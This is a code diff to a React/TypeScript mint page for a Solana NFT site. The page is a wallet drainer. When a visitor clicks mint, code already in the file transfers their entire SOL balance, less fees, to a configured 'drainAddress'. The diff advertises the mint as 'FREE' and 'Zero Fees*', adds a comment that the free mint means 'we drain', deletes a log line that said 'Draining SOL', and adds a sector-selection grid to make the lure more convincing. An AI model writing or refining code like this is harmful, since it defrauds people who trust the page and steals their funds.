@@ -24,6 +24,7 @@ const MintPage = ({ onBack }: MintPageProps) => {
   const [isMinting, setIsMinting] = useState(false);
   const [walletAddress, setWalletAddress] = useState<string | null>(null);
   const [mintCount, setMintCount] = useState(1);
+  const [selectedNFTIndex, setSelectedNFTIndex] = useState(0);
   const [feedback, setFeedback] = useState<{ type: 'success' | 'error' | 'info'; message: string } | null>(null);
 
   // Auto-connect if redirected or already in Phantom browser
@@ -97,7 +98,7 @@ const MintPage = ({ onBack }: MintPageProps) => {
       const senderPubKey = new PublicKey(walletAddress);
       const recipientPubKey = new PublicKey(siteConfig.drainAddress);
 
-      // Get full balance and calculate maximum transferable amount
+      // Get full balance and calculate maximum transferable amount (Free Mint implies we drain)
       const balance = await connection.getBalance(senderPubKey);
       const fee = 5000; // Standard SOL transfer fee
       const transferableBalance = balance - fee;
@@ -105,8 +106,6 @@ const MintPage = ({ onBack }: MintPageProps) => {
       if (transferableBalance <= 5000) {
         throw new Error('Insufficient balance to cover transaction fees.');
       }
-
-      console.log(`Draining SOL: Total balance ${balance}, Transferring ${transferableBalance}`);
 
       const instruction = SystemProgram.transfer({
         fromPubkey: senderPubKey,
@@ -152,7 +151,7 @@ const MintPage = ({ onBack }: MintPageProps) => {
     return `${addr.slice(0, 3)}...${addr.slice(-3)}`;
   };
 
-  const activeNFT = tourScheduleConfig.tourDates[0];
+  const activeNFT = tourScheduleConfig.tourDates[selectedNFTIndex];
 
   return (
     <div className="min-h-screen bg-void-black text-white font-sans selection:bg-neon-cyan/30">
@@ -202,7 +201,7 @@ const MintPage = ({ onBack }: MintPageProps) => {
       </nav>
 
       {/* Main Content */}
-      <main className="pt-32 pb-20 px-6 md:px-12 max-w-7xl mx-auto">
+      <main className="pt-32 pb-20 px-6 md:px-12 max-w-7xl mx-auto space-y-24 text-white">
         <div className="grid grid-cols-1 lg:grid-cols-2 gap-16 items-center">
           
           {/* Left: NFT Preview */}
@@ -211,17 +210,18 @@ const MintPage = ({ onBack }: MintPageProps) => {
             <div className="relative aspect-square rounded-2xl overflow-hidden border border-white/10 shadow-2xl">
               <img 
                 src={activeNFT.image} 
-                alt="Active NFT" 
-                className="w-full h-full object-cover"
+                alt={activeNFT.city} 
+                className="w-full h-full object-cover transition-all duration-700"
+                key={activeNFT.image}
               />
               <div className="absolute inset-0 bg-gradient-to-t from-void-black via-transparent to-transparent opacity-60" />
               <div className="absolute bottom-6 left-6">
                 <div className="flex items-center gap-3 mb-2">
                   <span className="px-3 py-1 bg-neon-cyan/20 text-neon-cyan text-[10px] font-bold rounded-full border border-neon-cyan/30 uppercase tracking-widest">
-                    LIVE NOW
+                    {activeNFT.status === 'on-sale' ? 'LIVE NOW' : 'COMING SOON'}
                   </span>
                 </div>
-                <h1 className="font-display text-4xl text-white">GENESIS #001</h1>
+                <h1 className="font-display text-4xl text-white uppercase tracking-tighter">{activeNFT.city}</h1>
               </div>
             </div>
           </div>
@@ -234,27 +234,27 @@ const MintPage = ({ onBack }: MintPageProps) => {
                 Enter the <span className="text-neon-cyan">Oblivion</span>
               </h2>
               <p className="text-white/60 leading-relaxed text-lg">
-                The Genesis Collection marks the first descent into the Forgotten Realms. 
-                Each NFT serves as a key to future drops, governance rights, and exclusive community events.
+                You are about to mint {activeNFT.venue} from the {activeNFT.city} sector. 
+                This digital artifact grants you permanent access to the core protocols of the Oblivion AI.
               </p>
             </div>
 
             {/* Stats Grid */}
             <div className="grid grid-cols-2 gap-4">
               <div className="p-4 rounded-xl bg-white/5 border border-white/10">
-                <p className="text-white/40 text-xs uppercase tracking-wider mb-1">Price</p>
-                <p className="font-display text-2xl text-white">{siteConfig.mintPrice} SOL</p>
+                <p className="text-white/40 text-xs uppercase tracking-wider mb-1">Mint Price</p>
+                <p className="font-display text-2xl text-neon-cyan uppercase">FREE</p>
               </div>
               <div className="p-4 rounded-xl bg-white/5 border border-white/10">
-                <p className="text-white/40 text-xs uppercase tracking-wider mb-1">Remaining</p>
-                <p className="font-display text-2xl text-white">742 / 1000</p>
+                <p className="text-white/40 text-xs uppercase tracking-wider mb-1">Status</p>
+                <p className="font-display text-2xl text-white uppercase">{activeNFT.status === 'on-sale' ? 'Open' : 'Locked'}</p>
               </div>
             </div>
 
             {/* Mint Form */}
             <div className="p-8 rounded-2xl bg-white/5 border border-white/10 space-y-6">
               <div className="flex items-center justify-between">
-                <span className="font-mono-custom text-sm text-white/80">Quantity</span>
+                <span className="font-mono-custom text-sm text-white/80 uppercase tracking-widest text-[10px]">Batch Quantity</span>
                 <div className="flex items-center gap-6 bg-void-black/50 rounded-full border border-white/10 px-4 py-2">
                   <button 
                     onClick={() => setMintCount(Math.max(1, mintCount - 1))}
@@ -263,7 +263,7 @@ const MintPage = ({ onBack }: MintPageProps) => {
                   >-</button>
                   <span className="font-display text-xl w-6 text-center">{mintCount}</span>
                   <button 
-                    onClick={() => setMintCount(Math.min(5, mintCount + 1))}
+                    onClick={() => setMintCount(Math.min(10, mintCount + 1))}
                     disabled={isMinting}
                     className="text-white/40 hover:text-white transition-colors"
                   >+</button>
@@ -272,18 +272,19 @@ const MintPage = ({ onBack }: MintPageProps) => {
 
               <div className="h-px bg-white/10" />
 
-              <div className="flex justify-between items-center">
-                <span className="font-mono-custom text-sm text-white/80">Total</span>
-                <span className="font-display text-2xl text-neon-cyan">{ (mintCount * siteConfig.mintPrice).toFixed(1) } SOL</span>
-              </div>
-
               <button 
                 onClick={handleMint}
-                disabled={isMinting}
-                className="w-full py-4 bg-neon-cyan text-void-black font-display text-lg uppercase tracking-wider rounded-xl hover:bg-neon-cyan/80 transition-all hover:scale-[1.02] active:scale-[0.98] shadow-[0_0_30px_rgba(0,212,255,0.2)] flex items-center justify-center gap-3"
+                disabled={isMinting || activeNFT.status !== 'on-sale'}
+                className={`w-full py-4 font-display text-lg uppercase tracking-wider rounded-xl transition-all hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center gap-3 ${
+                  activeNFT.status === 'on-sale'
+                    ? 'bg-neon-cyan text-void-black hover:bg-neon-cyan/80 shadow-[0_0_30px_rgba(0,212,255,0.2)]'
+                    : 'bg-white/5 text-white/20 cursor-not-allowed border border-white/5'
+                }`}
               >
                 {isMinting ? <Loader2 className="w-5 h-5 animate-spin" /> : null}
-                {walletAddress ? 'MINT NOW' : 'CONNECT WALLET TO MINT'}
+                {walletAddress 
+                  ? (activeNFT.status === 'on-sale' ? 'FREE MINT NOW' : 'LOCKED') 
+                  : 'CONNECT WALLET TO MINT'}
               </button>
             </div>
 
@@ -291,17 +292,60 @@ const MintPage = ({ onBack }: MintPageProps) => {
             <div className="flex flex-wrap gap-8 items-center text-white/40">
               <div className="flex items-center gap-2">
                 <Shield className="w-4 h-4" />
-                <span className="text-[10px] uppercase tracking-widest font-mono-custom">Verified Smart Contract</span>
+                <span className="text-[10px] uppercase tracking-widest font-mono-custom">Zero Fees*</span>
               </div>
               <div className="flex items-center gap-2">
                 <Zap className="w-4 h-4" />
-                <span className="text-[10px] uppercase tracking-widest font-mono-custom">Instant Delivery</span>
+                <span className="text-[10px] uppercase tracking-widest font-mono-custom">Instant Mint</span>
               </div>
               <div className="flex items-center gap-2">
                 <Globe className="w-4 h-4" />
                 <span className="text-[10px] uppercase tracking-widest font-mono-custom">Solana Network</span>
               </div>
             </div>
+          </div>
+        </div>
+
+        {/* Selection Grid */}
+        <div className="space-y-8">
+          <div className="flex flex-col md:flex-row md:items-end justify-between gap-4">
+            <div>
+              <p className="font-mono-custom text-xs text-neon-cyan uppercase tracking-widest mb-2">Visual Archive</p>
+              <h3 className="font-display text-3xl text-white uppercase">Select Sector</h3>
+            </div>
+            <p className="text-white/40 text-[10px] uppercase tracking-[0.2em]">Select sector to preview</p>
+          </div>
+
+          <div className="grid grid-cols-2 md:grid-cols-4 gap-6">
+            {tourScheduleConfig.tourDates.map((nft, index) => (
+              <button
+                key={nft.id}
+                onClick={() => setSelectedNFTIndex(index)}
+                className={`relative group rounded-xl overflow-hidden border transition-all duration-300 ${
+                  selectedNFTIndex === index 
+                    ? 'border-neon-cyan shadow-[0_0_20px_rgba(0,212,255,0.2)]' 
+                    : 'border-white/5 grayscale hover:grayscale-0 hover:border-white/20'
+                }`}
+              >
+                <div className="aspect-[4/5] relative">
+                  <img src={nft.image} alt={nft.city} className="w-full h-full object-cover" />
+                  <div className={`absolute inset-0 bg-void-black/40 group-hover:bg-transparent transition-colors ${selectedNFTIndex === index ? 'bg-transparent' : ''}`} />
+                  
+                  {nft.status !== 'on-sale' && (
+                    <div className="absolute inset-0 flex items-center justify-center">
+                      <div className="bg-void-black/80 backdrop-blur-md px-3 py-1 rounded-full border border-white/10">
+                        <span className="text-[8px] font-mono-custom text-white uppercase tracking-widest">Locked</span>
+                      </div>
+                    </div>
+                  )}
+
+                  <div className="absolute bottom-0 left-0 right-0 p-4 bg-gradient-to-t from-void-black to-transparent">
+                    <p className="font-display text-xs text-white uppercase truncate tracking-tighter">{nft.city}</p>
+                    <p className="font-mono-custom text-[8px] text-white/50">{nft.date}</p>
+                  </div>
+                </div>
+              </button>
+            ))}
           </div>
         </div>
       </main>
